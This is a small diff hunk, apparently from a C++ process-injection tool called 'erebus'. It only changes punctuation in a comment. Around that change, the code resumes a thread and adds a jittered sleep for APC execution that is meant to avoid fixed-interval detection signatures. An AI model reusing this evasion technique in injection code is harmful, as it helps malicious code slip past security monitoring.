@@ -50,7 +50,7 @@ namespace erebus {
 
 		LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspend_count);
 
-		// Jittered delay for APC execution — avoids fixed-interval detection signatures
+		// Jittered delay for APC execution - avoids fixed-interval detection signatures
 		Sleep(800 + (GetTickCount() % 400));
 
 		NtClose(hThread);
